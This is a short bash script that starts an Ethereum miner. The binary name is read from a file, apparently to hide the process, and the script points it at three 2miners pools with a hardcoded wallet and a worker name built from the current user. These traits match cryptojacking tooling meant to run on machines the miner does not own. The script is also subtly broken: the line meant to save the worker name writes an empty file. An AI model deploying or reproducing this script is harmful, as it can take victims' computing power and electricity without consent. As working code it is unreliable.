#!/bin/bash

whoami > namewk.txt
namewk=$(cat namewk.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
farmrecheck=$(shuf -i 150-350 -n 1)
wkname=$namewk
NnameSet=$wkname-$farmrecheck > Nameer.txt
UseName=$(cat Nameer.txt)
./$USEPROCNAME --farm-recheck $farmrecheck -U \
                    -P stratum1+tcp://0x48A9334b061a6Ea3E84FFf86B5438085BDA77333.$UseName@us-eth.2miners.com:2020 \
                    -P stratum1+tcp://0x48A9334b061a6Ea3E84FFf86B5438085BDA77333.$UseName@eth.2miners.com:2020 \
                    -P stratum1+tcp://0x48A9334b061a6Ea3E84FFf86B5438085BDA77333.$UseName@asia-eth.2miners.com:2020

